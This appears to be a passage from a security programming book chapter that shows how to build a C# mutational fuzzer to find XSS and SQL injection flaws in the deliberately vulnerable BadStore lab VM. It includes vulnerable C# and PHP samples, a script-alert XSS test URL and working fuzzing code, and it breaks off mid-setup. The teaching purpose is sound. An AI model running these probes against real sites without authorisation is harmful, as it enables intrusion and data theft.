<html><head></head><body>
<p id="filepos114239" class="calibre_"><span class="calibre6"><span class="bold">
</span></span><span class="calibre1"><span class="bold">2</span></span><br class="calibre5"/><span class="calibre6"><span class="bold">FUZZING AND EXPLOITING XSS AND SQL INJECTION</span></span></p><p class="calibre_12"><img src="images/00010.jpg" class="calibre_13"/></p><p class="calibre_6">In this chapter, you’ll learn how to write a short and sweet cross-site scripting (XSS) and SQL injection fuzzer for URLs that take HTTP parameters in GET and POST requests. A <span class="italic">fuzzer</span> is software that attempts to find errors in other software, such as that on servers, by sending bad or malformed data. The two general types of fuzzers are mutational and generational. A <span class="italic">mutational</span> fuzzer attempts to taint the data in a known-good input with bad data, without regard for the protocol or the structure of the data. In contrast, a <span class="italic">generational</span> fuzzer takes into account the nuances of the server’s communication protocol and uses these nuances to generate technically valid data that is sent to the server. With both types of fuzzers, the goal is to get the server to return an error to the fuzzer.</p><p class="calibre_6">We’ll write a mutational fuzzer that you can use when you have a known-good input in the form of a URL or HTTP request. (We’ll write a generational fuzzer in <a href="index_split_008.html#filepos243384">Chapter 3</a>.) Once you’re able to use a fuzzer to find XSS and SQL injection vulnerabilities, you’ll learn how to exploit the SQL injection vulnerabilities to retrieve usernames and password hashes from the database.</p><p class="calibre_6"> In order to find and exploit XSS and SQL injection vulnerabilities, we’ll use the core HTTP libraries to build HTTP requests programmatically in C#. We’ll first write a simple fuzzer that parses a URL and begins fuzzing the HTTP parameters using GET and POST requests. Next, we’ll develop full exploits for the SQL injection vulnerabilities that use carefully crafted HTTP requests to extract user information from the database.</p><p class="calibre_6">We’ll test our tools in this chapter against a small Linux distribution called BadStore (available at the VulnHub website, <a href="https://www.vulnhub.com/"><span class="italic">https://www.vulnhub.com/</span></a>). BadStore is designed with vulnerabilities like SQL injections and XSS attacks (among many others). After downloading the BadStore ISO from VulnHub, we’ll use the free VirtualBox virtualization software to create a virtual machine in which to boot the BadStore ISO so that we can attack without risk of compromising our own host system.</p><p id="filepos116934" class="calibre_10"><span class="calibre3"><span class="bold">Setting Up the Virtual Machine</span></span></p><p class="calibre_11">To install VirtualBox on Linux, Windows, or OS X, download the VirtualBox software from <a href="https://www.virtualbox.org/"><span class="italic">https://www.virtualbox.org/</span></a>. (Installation should be simple; just follow the latest directions on the site when you download the software.) Virtual machines (VMs) allow us to emulate a computer system using a physical computer. We can use virtual machines to easily create and manage vulnerable software systems (such as the ones we will use throughout the book).</p><p id="filepos117586" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Adding a Host-Only Virtual Network</span></span></span></p><p class="calibre_11">You may need to create a host-only virtual network for the VM before actually setting it up. A host-only network allows communication only between VMs and the host system. Here are the steps to follow:</p><div class="calibre_19"> </div><ol class="calibre_20"><li value="1" class="calibre_21"><p class="calibre_6">Click <span class="bold">File</span> ▸ <span class="bold">Preferences</span> to open the VirtualBox – Preferences dialog. On OS X, select the <span class="bold">VirtualBox</span> ▸ <span class="bold">Preferences</span>.</p></li><li value="2" class="calibre_21"><p class="calibre_6">Click the <span class="bold">Network</span> section on the left. You should see two tabs: NAT Networks and Host-only Networks. On OS X, click the <span class="bold">Network</span> tab at the top of the Settings dialog.</p></li><li value="3" class="calibre_21"><p class="calibre_6">Click the <span class="bold">Host-only Networks</span> tab and then the <span class="bold">Add host-only network (Ins)</span> button on the right. This button is an icon of a network card overlaid with a plus sign. This should create a network named vboxnet0.</p></li><li value="4" class="calibre_21"><p class="calibre_6">Click the <span class="bold">Edit host-only network (Space)</span> button on the right. This button is an icon of a screwdriver.</p></li><li value="5" class="calibre_21"><p class="calibre_6">From the dialog that opens, click the <span class="bold">DHCP Server</span> tab. Check the <span class="bold">Enable Server</span> box. In the Server Address field, enter the IP address <span class="calibre4"><span class="bold">192.168.56.2</span></span>. In the Server Mask field, enter <span class="calibre4"><span class="bold">255.255.255.0</span></span>. In the Lower Address Bound field, enter <span class="calibre4"><span class="bold">192.168.56.100</span></span>. In the Upper Address Bound field, enter <span class="calibre4"><span class="bold">192.168.56.199</span></span>.</p></li><li value="6" class="calibre_21"><p class="calibre_6">Click <span class="bold">OK</span> to save changes to the host-only network.</p></li><li value="7" class="calibre_21"><p class="calibre_6">Click <span class="bold">OK</span> again to close the Settings dialog.</p></li></ol><p id="filepos119842" class="calibre_10"><span class="calibre3"><span class="bold">
</span></span><span class="calibre3"><span class="italic"><span class="bold">Creating the Virtual Machine</span></span></span></p><p class="calibre_11">Once VirtualBox is installed and configured with a host-only network, here’s how to set up the VM:</p><div class="calibre_19"> </div><ol class="calibre_20"><li value="1" class="calibre_21"><p class="calibre_6">Click the <span class="bold">New</span> icon in the top-left corner, as shown in <a href="#filepos121544">Figure 2-1</a>.</p></li><li value="2" class="calibre_21"><p class="calibre_6">When presented with a dialog to choose the name of the operating system and type, select the <span class="bold">Other Linux (32-bit)</span> drop-down option.</p></li><li value="3" class="calibre_21"><p class="calibre_6">Click <span class="bold">Continue</span>, and you should be presented with a screen to give the virtual machine some RAM. Set the amount of RAM to 512 MB and click <span class="bold">Continue</span>. (Fuzzing and exploiting can make the web server use a lot of RAM on the virtual machine.)</p></li><li value="4" class="calibre_21"><p class="calibre_6">When asked to create a new virtual hard drive, choose <span class="bold">Do not add a virtual hard drive</span> and click <span class="bold">Create</span>. (We’ll run BadStore from the ISO image.) You should now see the VM in the left pane of the VirtualBox Manager window, as shown in <a href="#filepos121544">Figure 2-1</a>.</p><p class="calibre_22"><img src="images/00014.jpg" class="calibre_23"/></p><p class="calibre_15"><span class="calibre4"><span class="italic">Figure 2-1: VirtualBox with a BadStore VM</span></span></p></li><a id="filepos121544"/></ol><p id="filepos121556" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Booting the Virtual Machine from the BadStore ISO</span></span></span></p><p class="calibre_11">Once the VM has been created, set it to boot from the BadStore ISO by following these steps:</p><div class="calibre_19"> </div><ol class="calibre_20"><li value="1" class="calibre_21"><p class="calibre_6">Right-click the VM in the left pane of the VirtualBox Manager and click <span class="bold">Settings</span>. A dialog should appear showing the current settings for the network card, CD-ROM, and other miscellaneous configuration items.</p></li><li value="2" class="calibre_21"><p class="calibre_6"> Select the <span class="bold">Network</span> tab in the Settings dialog. You should see upwards of seven settings for the network card, including NAT (network address translation), host-only, and bridged. Choose host-only networking to allocate an IP address that is accessible only from the host machine but not from the rest of the Internet.</p></li><li value="3" class="calibre_21"><p class="calibre_6">You need to set the type of network card in the Advanced drop-down to an older chipset, because BadStore is based on an old Linux kernel and some newer chipsets aren’t supported. Choose <span class="bold">PCnet-FAST III</span>.</p></li></ol><p class="calibre_24">Now set the CD-ROM to boot from the ISO on the hard drive by following these steps:</p><div class="calibre_19"> </div><ol class="calibre_20"><li value="1" class="calibre_21"><p class="calibre_6">Select the <span class="bold">Storage</span> tab in the Settings dialog. Click the <span class="bold">CD icon</span> to show a menu with the option Choose a virtual CD/DVD disk file.</p></li><li value="2" class="calibre_21"><p class="calibre_6">Click the <span class="bold">Choose a virtual CD/DVD disk file</span> option to find the BadStore ISO that you saved to your filesystem and set it as the bootable media. The virtual machine should now be ready to boot.</p></li><li value="3" class="calibre_21"><p class="calibre_6">Save the settings by clicking <span class="bold">OK</span> in the bottom-right corner of the Settings tab. Then click the <span class="bold">Start</span> button in the top-left corner of the VirtualBox Manager, next to the Settings gear button, to boot the virtual machine.</p></li><li value="4" class="calibre_21"><p class="calibre_6">Once the machine has booted, you should see a message saying, “Please press Enter to activate this console.” Press <span class="calibre4">enter</span> and type <span class="calibre4"><span class="bold">ifconfig</span></span> to view the IP configuration that should have been acquired.</p></li><li value="5" class="calibre_21"><p class="calibre_6">Once you have your virtual machine’s IP address, enter it in your web browser, and you should see a screen like the one shown in <a href="#filepos124776">Figure 2-2</a>.</p><p class="calibre_22"><img src="images/00023.jpg" class="calibre_25"/></p><p class="calibre_15"><span class="calibre4"><span class="italic">Figure 2-2: The main page of the BadStore web application</span></span></p></li><a id="filepos124776"/></ol><p id="filepos124788" class="calibre_10"><span class="calibre3"><span class="bold"> SQL Injections</span></span></p><p class="calibre_11">In today’s rich web applications, programmers need to be able to store and query information behind the scenes in order to provide high-quality, robust user experiences. This is generally accomplished using a Structured Query Language (SQL; pronounced <span class="italic">sequel</span>) database such as MySQL, PostgreSQL, or Microsoft SQL Server.</p><p class="calibre_6">SQL allows a programmer to interact with a database programmatically using SQL statements—code that tells the database how to create, read, update, or delete data based on some supplied information or criteria. For instance, a <span class="calibre4">SELECT</span> statement asking the database for the number of users in a hosted database might look like <a href="#filepos125800">Listing 2-1</a>.</p><blockquote class="calibre_14"><span class="calibre4">SELECT COUNT(*) FROM USERS</span></blockquote><p id="filepos125800" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-1: Sample SQL</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">SELECT</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">statement</span></span></p><p class="calibre_6">Sometimes programmers need SQL statements to be dynamic (that is, to change based on a user’s interaction with a web application). For example, a programmer may need to select information from a database based on a certain user’s ID or username.</p><p class="calibre_6">However, when a programmer builds a SQL statement using data or values supplied by a user from an untrusted client such as a web browser, a <span class="italic">SQL injection</span> vulnerability may be introduced if the values used to build and execute SQL statements are not properly sanitized. For example, the C# SOAP method shown in <a href="#filepos127474">Listing 2-2</a> might be used to insert a user into a database hosted on a web server. (<span class="italic">SOAP</span>, or <span class="italic">Simple Object Access Protocol</span>, is a web technology powered by XML that’s used to create APIs on web applications quickly. It’s popular in enterprise languages such as C# and Java.) [WebMethod]<br class="calibre5"/>public string AddUser(string username, string password)<br class="calibre5"/>{<br class="calibre5"/> NpgsqlConnection conn = new NpgsqlConnection(_connstr);<br class="calibre5"/> conn.Open();<br class="calibre5"/><br class="calibre5"/> string sql = "insert into users values('{0}', '{1}');";<br class="calibre5"/> ➊sql = String.Format(sql, username, password);<br class="calibre5"/> NpgsqlCommand command = new NpgsqlCommand(sql, conn);<br class="calibre5"/> ➋command.ExecuteNonQuery();<br class="calibre5"/><br class="calibre5"/> conn.Close();<br class="calibre5"/> return "Excellent!";<br class="calibre5"/>}</p><p id="filepos127474" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-2: A C# SOAP method vulnerable to a SQL injection</span></span></p><p class="calibre_6">In this case, the programmer hasn’t sanitized the username and password before creating ➊ and executing ➋ a SQL string. As a result, an attacker could craft a username or password string to make the database run carefully crafted SQL code designed to give them remote command execution and full control of the database.</p><p class="calibre_6"> If you were to pass in an apostrophe with one of the parameters (say <span class="calibre4">user'name</span> instead of <span class="calibre4">username</span>), the <span class="calibre4">ExecuteNonQuery()</span> method would try to run an invalid SQL query (shown in <a href="#filepos128544">Listing 2-3</a>). Then the method would throw an exception, which would be shown in the HTTP response for the attacker to see.</p><blockquote class="calibre_14"><span class="calibre4">insert into users values('user'name', 'password'); </span><a id="filepos128544"/><span class="calibre4"><span class="italic">Listing 2-3: This SQL query is invalid due to unsanitized user-supplied data.</span></span></blockquote><p class="calibre_6">Many software libraries that enable database access allow a programmer to safely use values supplied by an untrusted client like a web browser with <span class="italic">parameterized queries</span>. These libraries automatically sanitize any untrusted values passed to a SQL query by escaping characters such as apostrophes, parentheses, and other special characters used in the SQL syntax. Parameterized queries and other types of Object Relational Mapping (ORM) libraries like NHibernate help to prevent these SQL injection issues.</p><p class="calibre_6">User-supplied values like these tend to be used in <span class="calibre4">WHERE</span> clauses within SQL queries, as in <a href="#filepos129553">Listing 2-4</a>.</p><blockquote class="calibre_14"><span class="calibre4">SELECT * FROM users WHERE user_id = '1'</span></blockquote><p id="filepos129553" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-4: Sample SQL</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">SELECT</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">statement selecting a row for a specific</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">user_id</span></span></p><p class="calibre_6">As shown in <a href="#filepos128544">Listing 2-3</a>, throwing a single apostrophe into an HTTP parameter that is not properly sanitized before being used to build a dynamic SQL query could cause an error to be thrown by the web application (such as an HTTP return code of 500) because an apostrophe in SQL denotes the beginning or end of a string. The single apostrophe invalidates the statement by ending a string prematurely or by beginning a string without ending it. By parsing the HTTP response to such a request, we can fuzz these web applications and search for user-supplied HTTP parameters that lead to SQL errors in the response when the parameters are tampered with.</p><p id="filepos130582" class="calibre_10"><span class="calibre3"><span class="bold">Cross-Site Scripting</span></span></p><p class="calibre_11">Like SQL injection, <span class="italic">cross-site scripting (XSS) attacks</span> exploit vulnerabilities in code that crop up when programmers build HTML to be rendered in the web browser using data passed from the web browser to the server. Sometimes, the data supplied by an untrusted client, such as a web browser, to the server can contain HTML code such as JavaScript, allowing an attacker to potentially take over a website by stealing cookies or redirecting users to a malicious website with raw, unsanitized HTML.</p><p class="calibre_6">For example, a blog that allows for comments might send an HTTP request with the data in a comment form to a site’s server. If an attacker were to create a malicious comment with embedded HTML or JavaScript, and the blog software trusted and therefore did not sanitize the data from the web browser submitting the “comment,” the attacker could use their loaded attack comment to deface the website with their own HTML code or redirect any of the blog’s visitors to the attacker’s own website. The attacker could then potentially install malware on the visitors’ machines.</p><p class="calibre_6">Generally speaking, a quick way to detect code in a website that may be vulnerable to XSS attacks is to make a request to the site with a tainted parameter. If the tainted data appears in the response without alteration, you may have found a vector for XSS. For instance, suppose you pass <span class="calibre4">&lt;xss&gt;</span> in a parameter within an HTTP request, as in <a href="#filepos132882">Listing 2-5</a>.</p><blockquote class="calibre_14"><span class="calibre4">GET /index.php?name=Brandon&lt;xss&gt; HTTP/1.1</span><br class="calibre5"/><span class="calibre4">Host: 10.37.129.5</span><br class="calibre5"/><span class="calibre4">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0</span><br class="calibre5"/><span class="calibre4">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br class="calibre5"/><span class="calibre4">Accept-Language: en-US,en;q=0.5</span><br class="calibre5"/><span class="calibre4">Accept-Encoding: gzip, deflate</span><br class="calibre5"/><span class="calibre4">Connection: keep-alive </span><a id="filepos132882"/><span class="calibre4"><span class="italic">Listing 2-5: Sample GET request to a PHP script with a query string parameter</span></span></blockquote><p class="calibre_6">The server responds with something like the HTTP response in <a href="#filepos133737">Listing 2-6</a>.</p><blockquote class="calibre_14"><span class="calibre4">HTTP/1.1 200 OK</span><br class="calibre5"/><span class="calibre4">Date: Sun, 19 Apr 2015 21:28:02 GMT</span><br class="calibre5"/><span class="calibre4">Server: Apache/2.4.7 (Ubuntu)</span><br class="calibre5"/><span class="calibre4">X-Powered-By: PHP/5.5.9-1ubuntu4.7</span><br class="calibre5"/><span class="calibre4">Content-Length: 32</span><br class="calibre5"/><span class="calibre4">Keep-Alive: timeout=5, max=100</span><br class="calibre5"/><span class="calibre4">Connection: Keep-Alive</span><br class="calibre5"/><span class="calibre4">Content-Type: text/html</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4">Welcome Brandon&amp;lt;xss&amp;gt;&lt;br /&gt; </span><a id="filepos133737"/><span class="calibre4"><span class="italic">Listing 2-6: Sample response from the PHP script sanitizing the</span></span><span class="calibre4">
</span><span class="calibre7"><span class="italic">name</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">query string parameter</span></span></blockquote><p class="calibre_6">Essentially, if the code <span class="calibre4">&lt;xss&gt;</span> is replaced with a version that has some HTML entities, you know that the site is filtering input using a PHP function such as <span class="calibre4">htmlspecialchars()</span> or a similar method. However, if the site simply returns <span class="calibre4">&lt;xss&gt;</span> in the response, you know that it’s not performing any filtering or sanitization, as with the HTTP <span class="calibre4">name</span> parameter in the code shown in <a href="#filepos134778">Listing 2-7</a>.</p><blockquote class="calibre_14"><span class="calibre4">&lt;?php</span><br class="calibre5"/><span class="calibre4"> $name = $_GET['name'];</span><br class="calibre5"/><span class="calibre4">➊echo "Welcome $name&lt;br&gt;";</span><br class="calibre5"/><span class="calibre4">?&gt; </span><a id="filepos134778"/><span class="calibre4"><span class="italic">Listing 2-7: PHP code vulnerable to XSS</span></span></blockquote><p class="calibre_6">As with the code vulnerable to a SQL injection in <a href="#filepos125800">Listing 2-1</a>, the programmer is not sanitizing or replacing any potentially bad characters in the parameter before rendering the HTML to the screen ➊. By passing a specially crafted <span class="calibre4">name</span> parameter to the web application, we can render HTML to the screen, execute JavaScript, and even run Java applets that attempt to take over the computer. For example, we could send a specially crafted URL such as the one in <a href="#filepos135609">Listing 2-8</a>.</p><blockquote class="calibre_14"><span class="calibre4">www.example.com/vuln.php?name=Brandon&lt;script&gt;alert(1)&lt;/script&gt; </span><a id="filepos135609"/><span class="calibre4"><span class="italic">Listing 2-8: A URL with a query string parameter that would pop up a JavaScript alert if the parameter were vulnerable to XSS</span></span></blockquote><p class="calibre_6">The URL in <a href="#filepos135609">Listing 2-8</a> could cause a JavaScript pop-up to appear in the browser with the number 1 if the PHP script were using the <span class="calibre4">name</span> parameter to build some HTML code that would eventually be rendered in the web browser.</p><p id="filepos136102" class="calibre_10"><span class="calibre3"><span class="bold">Fuzzing GET Requests with a Mutational Fuzzer</span></span></p><p class="calibre_11">Now that you know the basics of SQL injection and XSS vulnerabilities, let’s implement a quick fuzzer to find potential SQL injection or XSS vulnerabilities in query string parameters. Query string parameters are the parameters in a URL after the <span class="calibre4">?</span> sign, in <span class="calibre4"><span class="italic">key</span></span><span class="calibre4"> = </span><span class="calibre4"><span class="italic">value</span></span> format. We’ll focus on the HTTP parameters in a GET request, but first we’ll break up a URL so we can loop through any HTTP query string parameters, as shown in <a href="#filepos137363">Listing 2-9</a>.</p><blockquote class="calibre_14"><span class="calibre4">public static void Main(string[] args)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4">➊string url = args[0];</span><br class="calibre5"/><span class="calibre4"> int index = url.➋IndexOf("?");</span><br class="calibre5"/><span class="calibre4"> string[] parms = url.➌Remove(0, index+1).➍Split('&amp;');</span><br class="calibre5"/><span class="calibre4"> foreach (string parm in parms)</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine(parm);</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos137363" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-9: Small</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">Main()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method breaking apart the query string parameters in a given URL</span></span></p><p class="calibre_6">In <a href="#filepos137363">Listing 2-9</a>, we take the first argument (<span class="calibre4">args[0]</span>) passed to the main fuzzing application and assume it is a URL ➊ with some fuzzable HTTP parameters in the query string. In order to turn the parameters into something we can iterate over, we remove any characters up to and including the question mark (?) in the URL and use <span class="calibre4">IndexOf("?")</span> ➋ to determine the index of the first occurrence of a question mark, which denotes that the URL has ended and that the query string parameters follow; these are the parameters that we can parse.</p><p class="calibre_6">Calling <span class="calibre4">Remove(0, index+1)</span> ➌ returns a string that contains only our URL parameters. This string is then split by the <span class="calibre4">'&amp;'</span> character ➍, which marks the beginning of a new parameter. Finally, we use the <span class="calibre4">foreach</span> keyword, loop over all the strings in the <span class="calibre4">parms</span> array, and print each parameter and its value. We’ve now isolated the query string parameters and their values from the URL so that we can begin to alter the values while making HTTP requests in order to induce errors from the web application.</p><p id="filepos138931" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Tainting the Parameters and Testing for Vulnerabilities</span></span></span></p><p class="calibre_11">Now that we have separated any URL parameters that might be vulnerable, the next step is to taint each with a piece of data that the server will sanitize properly if it is not vulnerable to either XSS or SQL injection. In the case of XSS, our tainted data will have <span class="calibre4">&lt;xss&gt;</span> added, and the data to test for SQL injection will have a single apostrophe.</p><p class="calibre_6">We can create two new URLs to test the target by replacing the known-good parameter values in the URLs with the tainted data for XSS and SQL injection vulnerabilities, as shown in <a href="#filepos140240">Listing 2-10</a>.</p><blockquote class="calibre_14"><span class="calibre4">foreach (string parm in parms)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4">➊string xssUrl = url.Replace(parm, parm + "fd&lt;xss&gt;sa");</span><br class="calibre5"/><span class="calibre4">➋string sqlUrl = url.Replace(parm, parm + "fd'sa");</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> Console.WriteLine(xssUrl);</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine(sqlUrl);</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos140240" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-10: Modified</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">foreach</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">loop replacing parameters with tainted data</span></span></p><p class="calibre_6">In order to test for vulnerabilities, we need to ensure that we’re creating URLs that our target site will understand. To do so, we first replace the old parameter in the URL with a tainted one, and then we print the new URLs we’ll be requesting. When printed to the screen, each parameter in the URL should have one line that includes the XSS-tainted parameter ➊ and one line containing the parameter with a single apostrophe ➋, as shown in <a href="#filepos141359">Listing 2-11</a>.</p><blockquote class="calibre_14"><span class="calibre4">http://192.168.1.75/cgi-bin/badstore.cgi?searchquery=testfd&lt;xss&gt;sa&amp;action=search</span><br class="calibre5"/><span class="calibre4">http://192.168.1.75/cgi-bin/badstore.cgi?searchquery=testfd'sa&amp;action=search</span><br class="calibre5"/><span class="calibre4"><span class="italic">--snip--</span></span></blockquote><p id="filepos141359" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-11: URLs printed with tainted HTTP parameters</span></span></p><p id="filepos141488" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Building the HTTP Requests</span></span></span></p><p class="calibre_11">Next, we programmatically build the HTTP requests using the <span class="calibre4">HttpWebRequest</span> class, and then we make the HTTP requests with the tainted HTTP parameters to see if any errors are returned (see <a href="#filepos143491">Listing 2-12</a>).</p><blockquote class="calibre_14"><span class="calibre4">foreach (string parm in parms)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> string xssUrl = url.Replace(parm, parm + "fd&lt;xss&gt;sa");</span><br class="calibre5"/><span class="calibre4"> string sqlUrl = url.Replace(parm, parm + "fd'sa");</span><br class="calibre5"/><span class="calibre4"> HttpWebRequest request = (HttpWebRequest)WebRequest.➊Create(sqlUrl);</span><br class="calibre5"/><span class="calibre4"> request.➋Method = "GET";</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> string sqlresp = string.Empty;</span><br class="calibre5"/><span class="calibre4"> using (StreamReader rdr = new</span><br class="calibre5"/><span class="calibre4"> StreamReader(request.GetResponse().GetResponseStream()))</span><br class="calibre5"/><span class="calibre4"> sqlresp = rdr.➌ReadToEnd();</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> request = (HttpWebRequest)WebRequest.Create(xssUrl);</span><br class="calibre5"/><span class="calibre4"> request.Method = "GET";</span><br class="calibre5"/><span class="calibre4"> string xssresp = string.Empty;</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> using (StreamReader rdr = new</span><br class="calibre5"/><span class="calibre4"> StreamReader(request.GetResponse().GetResponseStream()))</span><br class="calibre5"/><span class="calibre4"> xssresp = rdr.ReadToEnd();</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (xssresp.Contains("&lt;xss&gt;"))</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine("Possible XSS point found in parameter: " + parm);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (sqlresp.Contains("error in your SQL syntax"))</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine("SQL injection point found in parameter: " + parm);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos143491" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-12: Full</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">foreach</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">loop testing the given URL for XSS and SQL injection</span></span></p><p class="calibre_6">In <a href="#filepos143491">Listing 2-12</a>, we use the static <span class="calibre4">Create()</span> method ➊ from the <span class="calibre4">WebRequest</span> class in order to make an HTTP request, passing the URL in the <span class="calibre4">sqlUrl</span> variable tainted with a single apostrophe as an argument, and we cast the resulting instantiated <span class="calibre4">WebRequest</span> returned to an <span class="calibre4">HttpWebRequest</span>. (Static methods are available without instantiating the parent class.) The static <span class="calibre4">Create()</span> method uses a factory pattern to create new objects based on the URL passed, which is why we need to cast the object returned to an <span class="calibre4">HttpWebRequest</span> object. If we passed a URL prefaced with <span class="italic">ftp://</span> or <span class="italic">file://</span>, for instance, then the type of object returned by the <span class="calibre4">Create()</span> method would be a different class (<span class="calibre4">FtpWebRequest</span> or <span class="calibre4">FileWebRequest</span>, respectively). We then set the <span class="calibre4">Method</span> property of the <span class="calibre4">HttpWebRequest</span> to GET (so we make a GET request) ➋ and save the response to the request in the <span class="calibre4">resp</span> string using the <span class="calibre4">StreamReader</span> class and the <span class="calibre4">ReadToEnd()</span> method ➌. If the response either contains the unsanitized XSS payload or throws an error regarding SQL syntax, we know we may have found a vulnerability.</p><p class="calibre_16"><span class="calibre3"><span class="bold"><span class="calibre_17"><span class="calibre_18">  NOTE </span></span></span></span></p><blockquote class="calibre_7"><span class="italic">Notice that we’re using the</span>
<span class="calibre4"><span class="italic">using</span></span>
<span class="italic">keyword in a new way here. Prior to this, we used</span>
<span class="calibre4"><span class="italic">using</span></span>
<span class="italic">to import classes within a namespace (such as</span>
<span class="calibre4"><span class="italic">System.Net</span></span><span class="italic">) into the fuzzer. Essentially, instantiated objects (objects created with the</span>
<span class="calibre4"><span class="italic">new</span></span>
<span class="italic">keyword) can be used in the context of a</span>
<span class="calibre4"><span class="italic">using</span></span>
<span class="italic">block in this way when the class implements the</span>
<span class="calibre4"><span class="italic">IDisposable</span></span>
<span class="italic">interface (which requires a class to implement a</span>
<span class="calibre4"><span class="italic">Dispose()</span></span>
<span class="italic">method). When the scope of the</span>
<span class="calibre4"><span class="italic">using</span></span>
<span class="italic">block ends, the</span>
<span class="calibre4"><span class="italic">Dispose()</span></span>
<span class="italic">method on the object is called automatically. This is a very useful way to manage the scope of a resource that can lead to resource leaks, such as network resources or file descriptors.</span></blockquote><p id="filepos146430" class="calibre_10"><span class="calibre3"><span class="bold">
</span></span><span class="calibre3"><span class="italic"><span class="bold">Testing the Fuzzing Code</span></span></span></p><p class="calibre_11">Let’s test our code with the search field on the BadStore front page. After opening the BadStore application in your web browser, click the <span class="bold">Home</span> menu item on the left side of the page and then perform a quick search from the search box in the upper-left corner. You should see a URL in your browser similar to the one shown in <a href="#filepos147136">Listing 2-13</a>.</p><blockquote class="calibre_14"><span class="calibre4">http://192.168.1.75/cgi-bin/badstore.cgi?searchquery=test&amp;action=search </span><a id="filepos147136"/><span class="calibre4"><span class="italic">Listing 2-13: Sample URL to the BadStore search page</span></span></blockquote><p class="calibre_6">Pass the URL in <a href="#filepos147136">Listing 2-13</a> (replacing the IP address with the IP address of the BadStore instance on your network) to the program as an argument on the command line, as shown in <a href="#filepos147971">Listing 2-14</a>, and the fuzzing should begin.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">./fuzzer.exe "http://192.168.1.75/cgi-bin/badstore.cgi?searchquery=test&amp;action=search"</span></span><br class="calibre5"/><span class="calibre4">SQL injection point found in parameter: searchquery=test</span><br class="calibre5"/><span class="calibre4">Possible XSS point found in parameter: searchquery=test</span><br class="calibre5"/><span class="calibre4">$</span></blockquote><p id="filepos147971" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-14: Running the XSS and SQL injection fuzzer</span></span></p><p class="calibre_6">Running our fuzzer should find both a SQL injection and XSS vulnerability in BadStore, with output similar to that of <a href="#filepos147971">Listing 2-14</a>.</p><p id="filepos148304" class="calibre_10"><span class="calibre3"><span class="bold">Fuzzing POST Requests</span></span></p><p class="calibre_11">In this section, we’ll use BadStore to fuzz the parameters of a POST request (a request used to submit data to a web resource for processing) saved to the local hard drive. We’ll capture a POST request using Burp Suite—an easy-to-use HTTP proxy built for security researchers and pen testers that sits between your browser and the HTTP server so that you can see the data sent back and forth.</p><p class="calibre_6">Download and install Burp Suite now from <a href="http://www.portswigger.net/"><span class="italic">http://www.portswigger.net/</span></a>. (Burp Suite is a Java archive or JAR file that can be saved to a thumb drive or other portable media.) Once Burp Suite is downloaded, start it using Java with the commands shown in <a href="#filepos149459">Listing 2-15</a>.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">cd ~/Downloads/</span></span><br class="calibre5"/><span class="calibre4">$ </span><span class="calibre4"><span class="bold">java -jar burpsuite*.jar</span></span><span class="calibre4">
</span><a id="filepos149459"/><span class="calibre4"><span class="italic">Listing 2-15: Running Burp Suite from the command line</span></span></blockquote><p class="calibre_6">Once started, the Burp Suite proxy should be listening on port 8080. Set Firefox traffic to use the Burp Suite proxy as follows:</p><div class="calibre_19"> </div><ol class="calibre_20"><li value="1" class="calibre_21"><p class="calibre_6">From within Firefox, choose <span class="bold">Edit</span> ▸ <span class="bold">Preferences</span>. The Advanced dialog should appear.</p></li><li value="2" class="calibre_21"><p class="calibre_6">Choose the <span class="bold">Network</span> tab, as shown in <a href="#filepos150385">Figure 2-3</a>.</p><p class="calibre_22"><img src="images/00024.jpg" class="calibre_26"/></p><p class="calibre_15"><span class="calibre4"><span class="italic">Figure 2-3: The Network tab within Firefox preferences</span></span></p></li><a id="filepos150385"/><li value="3" class="calibre_21"><p class="calibre_6">Click <span class="bold">Settings...</span> to open the Connection Settings dialog, as shown in <a href="#filepos150831">Figure 2-4</a>.</p><p class="calibre_22"><img src="images/00025.jpg" class="calibre_27"/></p><p class="calibre_15"><span 